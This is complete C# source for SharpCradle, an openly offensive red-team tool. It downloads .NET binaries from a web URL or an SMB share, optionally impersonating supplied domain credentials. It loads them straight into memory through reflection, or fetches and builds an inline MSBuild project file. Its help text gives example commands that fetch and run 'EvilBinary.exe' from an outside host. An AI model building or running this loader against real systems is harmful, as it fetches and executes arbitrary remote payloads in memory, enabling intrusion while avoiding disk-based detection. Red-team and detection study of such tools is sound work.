using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

namespace SharpCradle
{
    class Program
    {
        static void Main(string[] args)
        {
          try
          {
            //SharpCradle command modules
            if (args.Length <= 0 || args[0] == "help" || args[0] == "?")
            {
                help();
            }
            else if (args[0] == "-f")
            {
                string domain = ".\\";
                string uname = "anonymous";
                string password = "";
                string folderPathToBinary = args[1];
                object[] cmd = args.Skip(2).ToArray();
                
                if (args[0] == "-f" & args[1] == "-c")
                {
                    domain = args[2];
                    uname = args[3];
                    password = args[4];
                    folderPathToBinary = args[5];
                    cmd = args.Skip(6).ToArray();                    
                }
                using (new Impersonation(domain, uname, password))
                {
                    //Access folder and read the bytes from the binary file
                    FileStream fs = new FileStream(folderPathToBinary, FileMode.Open);
                    BinaryReader br = new BinaryReader(fs);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(fs.Length));
                    fs.Close();
                    br.Close();                    
                    loadAssembly(bin, cmd);
                }
            }//End if -f
            else if (args[0] == "-w")
            {
                object[] cmd = args.Skip(2).ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from the binary file
                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                    ms = new MemoryStream(client.DownloadData(args[1]));
                    BinaryReader br = new BinaryReader(ms);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                    ms.Close();
                    br.Close();
                   loadAssembly(bin, cmd);
                }
            }//End if -w
            else if (args[0] == "-p")
            {
                //Access web to capture, build, and execute inline CS project file
                var proj = System.Xml.XmlReader.Create(args[1]);
                var msbuild = new Microsoft.Build.Evaluation.Project(proj);
                msbuild.Build();
                proj.Close();
             }//End if -p

          }//End try
          catch
          {
            Console.WriteLine("Something went wrong! Check parameters and make sure binary uses managed code");
          }//End catch
        }//End Main  
        
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {       
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);                    
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly

        private static void help()
        {
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("How to use SharpCradle");
            Console.WriteLine("======================");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Download .NET binary from web");
            Console.WriteLine("-----------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -w https://192.168.1.10/EvilBinary.exe");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -w https://github.com/public/EvilBinary.exe?raw=true <arguments to pass to EvilBinary.exe>");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Download .NET binary from file share anonymously");
            Console.WriteLine("------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -f \\192.168.1.10\MyShare\EvilBinary.exe");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -f \\ComputerName\MyShare\EvilBinary.exe <arguments to pass to EvilBinary.exe>");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Download .NET binary from file share with credentials");
            Console.WriteLine("-----------------------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -f -c domain username password \\192.168.1.10\MyShare\EvilBinary.exe");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -f -c domain username password \\ComputerName\MyShare\EvilBinary.exe <arguments to pass to EvilBinary.exe>");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Download .NET inline project file from web");
            Console.WriteLine("-----------------------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj");
            Console.WriteLine();
            Console.WriteLine();
        }
    }//End Program
}//End Namespace

